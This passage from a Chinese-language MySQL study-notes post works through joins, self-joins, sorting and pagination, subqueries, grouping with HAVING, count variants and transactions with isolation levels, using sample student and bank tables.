src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408214829.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>两者的区别就在于最后一行的 <code>张三</code>，分析：</p>
<ol type="1">
<li>MySQL 会先去查看 <code>student</code>（或者 <code>result</code>
无所谓），获取其中所有的记录，记作结果 A；</li>
<li>然后查看 <code>result</code>，获取其中所有的记录，记作结果 B；</li>
<li>然后把 A 和 B 作对比，如果 A 和 B 的记录满足 <code>on</code>
后面的条件，则返回作为结果；</li>
</ol>
<p>以第一条记录为例，<code>student</code> 中的记录是</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408215335.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><code>result</code> 中的记录是：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408215340.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><code>student</code> 表中的第一条记录拿着 <code>studentno</code> 去
<code>result</code> 中的记录做比较，发现前 4 条都满足，则将 4 条记录和
<code>student</code> 表的第一条记录按照查询字段的格式整理成：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408215440.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>对 3 者的总结：</p>
<table>
<colgroup>
<col style="width: 13%" />
<col style="width: 86%" />
</colgroup>
<thead>
<tr class="header">
<th>操作</th>
<th>描述</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td><code>inner join</code></td>
<td>查询两张表的交集，也就是 <code>on</code> 后面条件满足的</td>
</tr>
<tr class="even">
<td><code>left join</code></td>
<td>查询左表的所有记录，然后拿着 <code>on</code>
后面的条件去右表查询，如果右表有满足条件的记录，则一并返回</td>
</tr>
<tr class="odd">
<td><code>right join</code></td>
<td>查询右表的所有记录，然后拿着 <code>on</code>
后面的条件去左表查询，如果左表有满足条件的记录，则一并返回</td>
</tr>
</tbody>
</table>
<h3 id="其他内容">3.4.2. 其他内容</h3>
<h4 id="where-的使用">3.4.2.1. Where 的使用</h4>
<p>比如查询不及格的同学，我们就可以查询所有的
<code>student</code>，然后查询
<code>result</code>，这样得到的结果是所有的同学和这些同学的结果，此时使用
`where 不及格 即可。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from result r right join student s on s.studentno=r.studentno where studentresult is NULL;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408220142.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h4 id="注意事项">3.4.2.2. 注意事项</h4>
<p>以下面语句为例：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s.studentno, s.studentname, subjectno, studentresult from result r right join student s on s.studentno=r.studentno where studentresult is NULL;</span><br></pre></td></tr></table></figure>
<p>可以看到我们查询了 4 个字段，但只有前两个字段前面有 <code>s.</code>
为什么呢？</p>
<ul>
<li>因为，<code>student</code> 和 <code>result</code> 两张表都有
<code>studetnno</code> 和
<code>studentname</code>，此时就需要判断你要使用哪张表的字段，MySQL
不会做判断，所以需要用户指出来，否则报错；</li>
<li>如果某个字段只有一张表有，就不需要点，否则就需要；</li>
</ul>
<h4 id="思考题">3.4.2.3. 思考题</h4>
<blockquote>
<p>先把张三的考试信息（<code>result</code>）记录删除；</p>
</blockquote>
<p>查询参加了考试的同学信息（学号、学生姓名、科目名、分数）</p>
<ol type="1">
<li>分析需求，学号和姓名在 <code>student</code> 表，科目名在
<code>subject</code> 表，分数在 <code>result</code> 表；</li>
<li>确定使用哪种连接查询；
<ol type="1">
<li>所有参加了考试的同学信息，应该以 <code>result</code>
为主，因为该表中有记录，则说明有参加考试，该表没记录，则说明没参加考试；</li>
<li>确定交叉点，和 <code>student</code> 表的交叉点是
<code>studentno</code>，和 <code>subject</code> 的交叉点是
<code>subjectno</code>，因此可以先 <code>left join</code>
成绩表和学生表，然后把前面的结果再和科目表 <code>left join</code>；</li>
</ol></li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s1.studentno, s1.studentname, s2.subjectname, r.studentresult from result r left join student s1 on r.studentno=s1.studentno left join subject s2 on r.subjectno=s2.subjectno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408220924.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到没有张三的记录，说明结果正确。</p>
<h3 id="自连接">3.4.3. 自连接</h3>
<p>假设存在这样一张表：</p>
<table>
<thead>
<tr class="header">
<th>pid</th>
<th>sid</th>
<th>name</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>1</td>
<td>2</td>
<td>信息技术</td>
</tr>
<tr class="even">
<td>1</td>
<td>3</td>
<td>软件开发</td>
</tr>
<tr class="odd">
<td>1</td>
<td>5</td>
<td>美术设计</td>
</tr>
<tr class="even">
<td>2</td>
<td>8</td>
<td>办公信息</td>
</tr>
<tr class="odd">
<td>3</td>
<td>4</td>
<td>数据库</td>
</tr>
<tr class="even">
<td>3</td>
<td>6</td>
<td>web 开发</td>
</tr>
<tr class="odd">
<td>5</td>
<td>7</td>
<td>ps 技术</td>
</tr>
</tbody>
</table>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408223046.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>Pid 就是父分类的 id，sid 就是子分类的 id，比如第一条记录：信息技术的
pid 是 1，意味着信息技术是 pid 为 1 的大类的一个子类，其 sid 为
2，类似的，办公信息就是 pid 为 2 的大类下的一个小类，其 sid 为 8。</p>
<p>现在需求：要求查询出来的结果是
“父分类，子分类”的结构，即最后的结果是：</p>
<table>
<thead>
<tr class="header">
<th>父分类</th>
<th>子分类</th>
</tr>
</thead>
<tbody>
<tr class="odd">
<td>软件开发</td>
<td>数据库</td>
</tr>
<tr class="even">
<td>软件开发</td>
<td>web 开发</td>
</tr>
<tr class="odd">
<td>美术设计</td>
<td>ps 技术</td>
</tr>
<tr class="even">
<td>信息技术</td>
<td>办公信息</td>
</tr>
</tbody>
</table>
<p>想要查询到上述结构：</p>
<ol type="1">
<li>查询一遍该表，获得所有记录 A；</li>
<li>再查询一遍改变，获得所有记录 B；</li>
<li>将 A 中 <code>pid</code> 和 B 中 <code>sid</code> 相同的记录返回，A
中的作为父分类，B 中的作为子分类；</li>
</ol>
<p>像这样把一张表当做两张表查就是自连接情况，语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select p.name as 父分类, s.name as 子分类</span><br><span class="line">from category as p, category as s</span><br><span class="line">where p.pid=s.sid;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230408223811.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>上图中，第一次查询是查看 <code>category</code>
的信息，第二次才是使用上述语句查询，符合结果。</p>
<h2 id="分页和排序">3.5. 分页和排序</h2>
<h3 id="排序">3.5.1. 排序</h3>
<p>语句：<code>ORDER BY 字段 排序方式</code>，其中排序方式有：</p>
<ul>
<li>升序：<code>ASC</code>；</li>
<li>降序：<code>DESC;</code></li>
</ul>
<p>作用：就是把查询结果根据字段进行排序。</p>
<p>比如把成绩安装降序的方式进行排序，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from result order by studentresult DESC;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409090711.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="分页">3.5.2. 分页</h3>
<p>语句：<code>LIMIT 起始记录, 记录条数</code>，其中起始记录从 0
开始，该语句放在整个查询语句的最后面，</p>
<p>作用：设置返回的结果，如果表内数据很多，一次性全部返回内存压力很大，所以才有了分页操作。</p>
<p>比如，我们只想显示成绩前 5 的记录，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select * from result order by studentresult DESC limit 0, 5;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409090852.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>为什么叫做分页呢？</p>
<ul>
<li>如果把 <code>limit 0,5</code> 看做是第一页，并且每页 5 条记录，那么
<code>limit 5, 5</code> 就是第二页，<code>limit 10, 5</code>
就是第三页，依次类推，第 n 页就是 <code>limit (n-1)*5, 5</code>。</li>
</ul>
<h3 id="思考题-1">3.5.3. 思考题</h3>
<p>查询“高等数学-1”课程成绩第一的学生，并且分数要高于
80（学号、姓名、课程名称、分数）。</p>
<p>需求分析：</p>
<ul>
<li>学号、姓名可以在 <code>student</code> 表内，课程名称在
<code>subject</code> 表内，分数在 <code>result</code>
表内，因此需要使用联表查询，即
<code>s1.studentno, s1.studentname, s2.subjectname, r.studentresult from result r inner join student s1 on r.studentno = s1.studentno inner join subject s2 on r.subjectno = s2.subjectno</code>；</li>
<li>课程名称为 <code>高等数学-1</code>，并且分数高于 80，即
<code>where s2.subjectname =  '高等数学-1'and r.studentresult &gt; 80</code></li>
<li>课程成绩第一，主表应该是
<code>result</code>，并且根据课程成绩降序排列，即
<code>order by r.studentresult desc</code>；</li>
<li>课程成绩第一，说明只需要一条记录，所以使用
<code>limit 0,1</code>；</li>
</ul>
<p>组合成完整的命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select s1.studentno, s1.studentname, s2.subjectname, r.studentresult from result r inner join student s1 on r.studentno = s1.studentno inner join subject s2 on r.subjectno = s2.subjectno where s2.subjectname = &#x27;高等数学-1&#x27; and r.studentresult &gt; 80 order by r.studentresult desc limit 0, 1;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409092129.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>需要注意查询语句中各个内容所在的位置：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select 表达式 from 表 [联表] [where子句] [order by] [limit];</span><br></pre></td></tr></table></figure>
<h2 id="子查询和嵌套查询">3.6. 子查询和嵌套查询</h2>
<p>题目
1：查询“高等数学-2”的所有考试结果（学号，科目编号，成绩），降序排列。</p>
<p>方式一：连接查询</p>
<p>分析：</p>
<ol type="1">
<li>学号来自 <code>student</code>，科目编号、成绩来自
<code>result</code>，<code>student</code> 和 <code>result</code>
的交叉在于 <code>studentno</code>，“高等数学-2”来自
<code>subject</code>；</li>
<li>条件 <code>where subjectname='高等数学-2'</code>；</li>
<li>排列方式：<code>order by studentresult desc</code>；</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select stu.studentno, sub.subjectno, r.studentresult from result r inner join student stu on r.studentno = stu.studentno inner join subject sub on r.subjectno = sub.subjectno where sub.subjectname = &#x27;高等数学-2&#x27; order by r.studentresult desc;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409100528.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>方式二：子查询（由里及外）</p>
<p>可以分为两次理解：</p>
<ol type="1">
<li>从 <code>result</code>
表中查询“高等数学-2”的所有考试结果，也就是：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select studentno, subjectname, studentresult from result where subjectname=“高等数学-2”;</span><br></pre></td></tr></table></figure>
<ol start="2" type="1">
<li>因为 <code>result</code> 表没有 <code>subjectname</code>，所以 where
子句不好满足，但 <code>result</code> 有
<code>subjectno</code>，因此可以将
<code>where subjectname=“高等数学-2”</code> 变为
<code>where subjectno=“高等数学-2”的编号</code>，“高等数学-2”的编号可以从
<code>subject</code> 中获得，使用
<code>select subjectno from subject where subjectname='高等数学-2'</code>，所以组合就成为了：</li>
</ol>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">where subjectno=(select subjectno from subject where subjectname=&#x27;高等数学-2&#x27;)</span><br></pre></td></tr></table></figure>
<p>将两步合为一步，得到如下代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select studentno, subjectno, studentresult from result r where subjectno=(select subjectno from subject where subjectname=&quot;高等数学-2&quot;);</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409100707.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<blockquote>
<p>子查询有一个重要的限制，那就是查询的字段要都在一张表中，比如这里的学号，科目编号，成绩都可以在
<code>result</code> 表中找到。</p>
</blockquote>
<p>题目 2：查询“高等数学-2”分数不小于 75 分的学生学号和姓名。</p>
<p>联表查询：</p>
<ul>
<li>“高等数学-2”在 <code>subject</code> 表，学号和姓名在
<code>student</code> 表，成绩在 <code>result</code>
表，要找学号和姓名，因此可以以 <code>student</code> 为主。交叉点有两个
<code>student.studentno = result.studetno</code> 和
<code>result.subjectno = subject.subjectno</code></li>
<li>条件
<code>where result.studentresult &gt;= 75 and subject.subjectname='高等数学-2'</code></li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select stu.studentno, stu.studentname from student stu inner join result r on stu.studentno = r.studentno inner join subject sub on r.subjectno = sub.subjectno where sub.subjectname=&#x27;高等数学-2&#x27; and r.studentresult &gt;= 75;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409101837.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>子查询：</p>
<ul>
<li>从学生表里找到所有学生的学号和姓名，条件时
<code>where result.studentresult &gt;= 75 and subject.subjectname='高等数学-2'</code></li>
<li>对两个条件分别分析：
<ul>
<li><code>result.studentresult &gt;= 75</code>：<code>student</code>
表没有 <code>studentresult</code>，与 <code>result</code> 表有关联的是
<code>studentno</code>，所以可以改为
<code>where studentno=(result表内成绩大于等于75的记录的studentno)</code>，即
<code>where studentno=(select studentno from result where studentresult &gt;= 75)</code></li>
<li><code>subject.subjectname='高等数学-2'</code>：<code>student</code>
表和 <code>subject</code> 表没有任何关联，而 <code>result</code> 表和
<code>subject</code> 表有关联，所以该语句应该和第一个条件结合，写成
<code>where studentno=(select studentno from result where studentresult &gt;= 75 and subjectno=(subject表中subjectname为高等数学-2的记录的subjectno))</code>，即
<code>where studentno=(select studentno from result where studentresult &gt;= 75 and subjectno=(select subjectno from subject where subjectname='高等数学-2'))</code></li>
</ul></li>
</ul>
<p>因此最终的命令为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select studentno, studentname from student where studentno=(select studentno from result where studentresult &gt;= 75 and subjectno=(select subjectno from subject where subjectname=&#x27;高等数学-2&#x27;));</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409102557.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<h3 id="注意">3.6.1. 注意</h3>
<ol type="1">
<li>子查询有一个重要的限制，那就是 <strong>查询的字段</strong>
要都在一张表中，比如题目 1的学号，科目编号，成绩都可以在
<code>result</code> 表中找到。</li>
<li>在满足第一点的情况下，查询的条件可能一张表无法满足，所以需要引入其他表的某个或某些字段作为条件；</li>
<li>先查询 <code>where</code>
内的子查询，把子查询的结果给外层条件作为筛选，由内及外的一层一层查询；</li>
<li>子查询的本质是查询一张表，其他表只是作为条件，所以结果只能是一张表的字段；这和联表查询不一样，联表查询的本质是多张表一起查询，所以结果可以是多张表的字段；</li>
<li>子查询效率低于联表查询；</li>
</ol>
<h2 id="分组和过滤">3.7. 分组和过滤</h2>
<p>题目 1：查询不同课程的平均分、最高分、最低分。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sub.subjectname, avg(r.studentresult), max(r.studentresult), min(r.studentresult) from result r inner join subject sub on r.subjectno=sub.subjectno;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409115110.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>这条语句会报错的，原因很简单，在 <code>result</code> 表和
<code>subject</code> 表中，<code>subjectname</code>
可以有很多个，但平均分、最高分、最低分只会有一个计算结果，会导致结果个数不匹配，而我们要求的是不同课程的平均分、最高分、最低分，所以不能计算整张表的平均分、最高分、最低分，而是分成不同组来计算，分组的条件就是课程名称，所以真正的语句如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sub.subjectname, avg(r.studentresult), max(r.studentresult), min(r.studentresult) from result r inner join subject sub on r.subjectno=sub.subjectno group by sub.subjectname;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409115351.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>题目 2：在题目 1 的基础上增加一个条件，要求只显示平均分不小于 70
的才显示。</p>
<p>很自然的会这么写：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sub.subjectname, avg(r.studentresult), max(r.studentresult), min(r.studentresult) from result r inner join subject sub on r.subjectno=sub.subjectno where avg(r.studentresult) &gt;= 70 group by sub.subjectname;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409115510.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>报错了，因为 <code>where</code> 语句是在查询完成之后进行的操作，而
<code>group by</code> 在 <code>where</code>
后面，此时语句还没有执行完成，所以报错，因此 <code>group by</code>
不使用 <code>where</code> 来过滤，而是使用
<code>having</code>，命令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sub.subjectname, avg(r.studentresult), max(r.studentresult), min(r.studentresult) from result r inner join subject sub on r.subjectno=sub.subjectno group by sub.subjectname having avg(r.studentresult) &gt;= 70;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409115643.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p><code>having</code> 后面的内容和 <code>where</code> 一样，只不过
<code>having</code> 的位置在 <code>group by</code> 后面，所以执行到
<code>having</code> 时，前面已经执行完毕，查询结果已经得到，此时通过
<code>having</code> 过滤就不会报错。</p>
<h1 id="函数">4. 函数</h1>
<ul>
<li>可以看一下 [[4. 数据库内置函数研究]]；</li>
<li>或者直接网上搜</li>
<li>又或者官方文档：<a
href="https://dev.mysql.com/doc/refman/8.0/en/built-in-function-reference.html">MySQL
:: MySQL 8.0 Reference Manual :: 12.1 Built-In Function and Operator
Reference</a></li>
</ul>
<h2 id="count-相关问题">4.1. Count 相关问题</h2>
<p>先向 <code>subject</code> 表插入一条记录，其内容为：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409113716.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>命令 1：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(gradeid) from subject;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409113807.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>结果是有 17 条记录。</p>
<p>命令 2：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(*) from subject;</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409113834.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>命令 3：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select count(1) from subject; # 或者 count(任意数字)</span><br></pre></td></tr></table></figure>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409113916.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>命令 2 和命令 3 的结果都是 18 条记录，实际上也是 18 条记录。</p>
<p><code>count(列名)</code> 和
<code>count(*)</code>、<code>count(1)</code> 的区别是：前者会忽略 null
值，而后面的两者不会忽略 null 值，即前者会统计非 null
值的记录数，而后者会统计所有的记录数。</p>
<p><code>count(*)</code> 和 <code>count(1)</code> 的区别：</p>
<ul>
<li>前者包括了所有的列，相当于行数，在统计结果的时候，<strong>不会忽略为
NULL 的值</strong></li>
<li>后者忽略所有列，用1代表每行记录，在统计结果的时候，<strong>不会忽略为
NULL 的值</strong></li>
</ul>
<p>执行效率上：</p>
<ul>
<li>列名为主键，<code>count(列名</code>)会比 <code>count(1)</code>
快</li>
<li>列名不为主键，<code>count(1)</code>会比<code>count(列名)</code>快</li>
<li>如果表多个列并且没有主键，则 <code>count(1)</code> 的执行效率优于
<code>count(*)</code></li>
<li>如果有主键，则
<code>select count（主键）</code>的执行效率是最优的</li>
<li>如果表只有一个字段，则 <code>select count(*)</code> 最优。</li>
</ul>
<p>可以看一下 <code>select * from subject</code> 和
<code>select 1 from subject</code> ：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409114349.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>后者估计在获得前者的数据后进一步做了操作，所以导致
<code>count(1)</code> 效率略低于 <code>count(*)</code>。</p>
<h2 id="数据库级别的-md5-加密">4.2. 数据库级别的 <code>MD5</code>
加密</h2>
<p>可以使用 <code>md(5)</code> 函数进行加密。</p>
<h1 id="事务">5. 事务</h1>
<h2 id="概述-1">5.1. 概述</h2>
<p>一个简单的事物——转账（A 给 B 转账 100），分为两步：</p>
<ol type="1">
<li>A 原先有 1000，向 B 转账 100，此时 A 账户余额为 900；</li>
<li>B 原先有 1000，接收来自 A 的转账，此时 B 账户余额为 1100；</li>
</ol>
<p>这两步都完成才称得上是一个完整的事务。</p>
<p>事务原则：ACID 原则。ACID 概念：<a
href="https://zh.wikipedia.org/zh-hans/ACID">ACID -
维基百科，自由的百科全书</a></p>
<p>ACID，是指数据库管理系统（DBMS）在写入或更新资料的过程中，为保证交易（transaction）是正确可靠的，所必须具备的四个特性：原子性（atomicity，或称不可分割性）、一致性（consistency）、隔离性（isolation，又称独立性）、持久性（durability）。</p>
<p>在数据库系统中，一个事务是指：由一系列数据库操作组成的一个完整的逻辑过程。例如银行转帐，从原账户扣除金额，以及向目标账户添加金额，这两个数据库操作的总和，构成一个完整的逻辑过程，不可拆分。这个过程被称为一个事务，具有
ACID 特性。</p>
<ul>
<li>原子性（Atomicity）：一个事务（transaction）中的所有操作，<strong>或者全部完成，或者全部不完成</strong>，不会结束在中间某个环节。事务在执行过程中发生错误，会被回滚（Rollback）到事务开始前的状态，就像这个事务从来没有执行过一样。即，事务不可分割、不可约简。</li>
<li>一致性（Consistency）：在事务开始之前和事务结束以后，数据库的完整性没有被破坏。这表示写入的资料必须完全符合所有的预设约束、触发器、级联回滚等。</li>
<li>事务隔离（Isolation）：数据库允许多个并发事务同时对其数据进行读写和修改的能力，隔离性可以防止多个事务并发执行时由于交叉执行而导致数据的不一致。事务隔离分为不同级别，包括未提交读（Read
uncommitted）、提交读（read committed）、可重复读（Repeatable
read）和序列化（Serializable）。</li>
<li>持久性（Durability）：事务处理结束后，对数据的修改就是永久的，即便系统故障也不会丢失，事务一旦处理完成不可逆。</li>
</ul>
<p>事务的并发操作可能会出现 <strong>脏读、不可重复读、幻读</strong>
三个问题。</p>
<ul>
<li><strong>脏读</strong>：
<ul>
<li>事例：老板要给程序员发工资，程序员的工资是 3.6
万/月。但是发工资时老板不小心按错了数字，按成 3.9
万/月，该钱已经打到程序员的户口，但是事务还没有提交，就在这时，程序员去查看自己这个月的工资，发现比往常多了
3
千元，以为涨工资了非常高兴。但是老板及时发现了不对，马上回滚差点就提交了的事务，将数字改成
3.6 万再提交；</li>
<li>解释：A 事务获取了 B 事务还没提交的数据；</li>
</ul></li>
<li><strong>不可重复读</strong>：
<ul>
<li>事例：程序员拿着信用卡去享受生活（卡里当然是只有 3.6
万），当他买单时（程序员事务开启），收费系统事先检测到他的卡里有 3.6
万，<strong>就在这个时候</strong>！！程序员的妻子要把钱全部转出充当家用，并提交。当收费系统准备扣款时，再检测卡里的金额，发现已经没钱了（第二次检测金额当然要等待妻子转出金额事务提交完）。程序员就会很郁闷，明明卡里是有钱的…</li>
<li>解释：这个事例中，出现了一个事务范围内（程序员事务）两个相同的查询（妻子转钱前后）却返回了不同数据，这就是不可重复读；</li>
</ul></li>
<li><strong>幻读</strong>：
<ul>
<li>事例：程序员某一天去消费，花了 2
千元，然后他的妻子去查看他今天的消费记录（全表扫描
FTS，妻子事务开启），看到确实是花了 2 千元，就在这个时候，程序员花了 1
万买了一部电脑，即新增 INSERT
了一条消费记录，并提交。当妻子打印程序员的消费记录清单时（妻子事务提交），发现花了
1.2 万元，似乎出现了幻觉，这就是幻读；</li>
<li>解释：A 事务内的两个查询之前有 B
事务<strong>插入新的数据</strong>，导致前后两次查询结果不同；</li>
</ul></li>
</ul>
<p>其中，事务隔离分为不同级别，级别依次升高：</p>
<ol type="1">
<li>Read uncommitted：就是 A 事务可以读取未提交的 B
事务的数据，什么问题都不能解决；</li>
<li>Read committed：就是 A 事务要等 B
事务提交后才能读取数据。可以解决脏读问题，但不能解决不可重复读；</li>
<li>Repeatable
read：就是在开始读取数据（事务开启）时，不再允许<strong>修改操作</strong>。可以解决不可重复读问题，无法解决幻读，因为幻读最重要的是在事务提交前，另一个事务插入了记录，幻读是
INSERT 导致的，不是 UPDATE；</li>
<li>Serializable：最高的事务隔离级别，在该级别下，事务串行化顺序执行，可以避免脏读、不可重复读与幻读。但是这种事务隔离级别效率低下，比较耗数据库性能，一般不使用；</li>
</ol>
<h2 id="执行事务">5.2. 执行事务</h2>
<p>MySQL 默认开启事务自动提交，可以查 <code>autocommit</code>
变量查看，一些语句：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. set autocommit = 0; # 关闭事务自动提交</span><br><span class="line">2. set autocommit = 1; # 开启事务自动提交</span><br><span class="line">3. START TRANSACTION;  # 标记一个事务的开始，从这之后的sql语句都属于同一个事务</span><br><span class="line">4. COMMIT; # 提交事务（表示事务处理成功）</span><br><span class="line">5. ROLLBACK; # 回到事务开启前的样子（表示事务处理失败）</span><br><span class="line">6. SAVEPOINT 保存点名 # 设置一个事务的保存点</span><br><span class="line">7. ROLLBACK TO SAVEPOINT 保存点名 # 回滚到一个事务的保存点</span><br><span class="line">8. RELEASE SAVEPOINT 保存点名 # 撤销保存点</span><br></pre></td></tr></table></figure>
<p>一组事务完整执行的流程图：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409201710.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<hr />
<p>模拟转账事务：</p>
<p>环境准备，创建一个数据库 <code>bank</code>，在其下创建一张表
<code>account</code>，添加两条记录 A, B 默认余额 1000。</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">CREATE DATABASE `bank` DEFAULT CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci;</span><br><span class="line"></span><br><span class="line">CREATE TABLE `account`(</span><br><span class="line">`id` int AUTO_INCREMENT NOT NULL,</span><br><span class="line">`name` varchar(30) NOT NULL,</span><br><span class="line">`money` decimal(9, 2) NOT NULL,</span><br><span class="line">PRIMARY KEY(`id`)</span><br><span class="line">)ENGINE=InnoDB DEFAULT CHARSET=utf8mb4;</span><br><span class="line"></span><br><span class="line"># decimal(P, D)，表示可以存储一个P位的数，其中小数有D位</span><br><span class="line"></span><br><span class="line">INSERT INTO `account` (`name`, `money`) VALUES(&#x27;A&#x27;, &#x27;1000.00&#x27;), (&#x27;B&#x27;, &#x27;1000.00&#x27;);</span><br></pre></td></tr></table></figure>
<p>事务命令；</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. SET autocommit = 0;</span><br><span class="line">2. START TRANSACTION;</span><br><span class="line">3. UPDATE account SET money = money - 200 WHERE `name` = &#x27;A&#x27;;</span><br><span class="line">4. UPDATE account SET money = money + 200 WHERE `name` = &#x27;B&#x27;;</span><br><span class="line">5. COMMIT; 或者 ROLLBACK;</span><br><span class="line">6. SET autocommit = 1; # 如果是 ROLLBACK 则不需要这句</span><br></pre></td></tr></table></figure>
<p>先来一个回滚的：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409201607.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，回滚使数据恢复成事务刚开始的样子。</p>
<p>来一个提交的：</p>
<figure>
<img
src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20230409201859.png"
alt="image.png" />
<figcaption aria-hidden="true">image.png</figcaption>
</figure>
<p>可以看到，提交之后，表内数据发生了变化，并且通过回滚也无法恢复，这就是持久化的体现。最后开启自动提交。</p>
<h1 id="索引">6. 索引</h1>
